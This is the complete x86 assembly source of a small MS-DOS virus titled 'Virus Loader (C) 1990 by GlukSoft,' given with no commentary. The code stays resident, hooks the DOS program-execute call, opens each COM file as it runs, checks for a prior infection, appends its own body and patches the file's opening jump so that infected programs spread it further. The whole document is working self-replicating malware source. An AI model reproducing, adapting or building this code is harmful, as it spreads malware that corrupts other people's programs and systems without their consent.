

.286
.model	tiny
.radix	16
.code
e	equ	0E5
	org	100
a	db	0E9
	dw	d-b
b:	mov	ah,9
	int	21
	ret
c	db	'Virus Loader (C) 1990 by GlukSoft.',0DH,0A,24
d:	pusha
	mov	di,si
	add	si,[si+1]
	mov	al,h-d
	add	si,ax
	movsb
	movsw
	mov	es,ax
	xor	di,di
	sub	si,ax
	pusha
	cmpsw
	popa
	mov	cl,(k-d)/2
	rep	movsw
	jz	f
	mov	ds,cx
	mov	si,di
	movsw
	mov	[si-2],ax
	xchg	[si],ax
	stosw
	push	cs
	pop	ds
f:	push	cs
	pop	es
	popa
	jmp	si
	db	0E9
g:	mov	dx,offset c
h:	pusha
	push	ds
	xor	ah,4BH
	jnz	j
	mov	ax,3D02
	int	e
	jc	j
	xchg	bx,ax
	push	cs
	pop	ds
	mov	ah,3F
	mov	cx,3
	mov	dx,g-d
	mov	si,dx
	int	e
	cmp	byte ptr [si],'M'
	jz	i
	add	ax,41FF
	cwd
	mov	cx,dx
	int	e
	sub	al,3
	mov	bp,ax
	mov	cl,k-d
	sub	ax,cx
	cmp	ax,[si+1]
	jz	i
	mov	ah,40
	int	e
	mov	ax,4200
	mov	cx,dx
	int	e
	mov	ah,40
	mov	dl,g-d-1
	mov	cl,3
	mov	[si],bp
	int	e
i:	mov	ah,3E
	int	e
j:	pop	ds
	popa
	db	0EA
k:
end	a

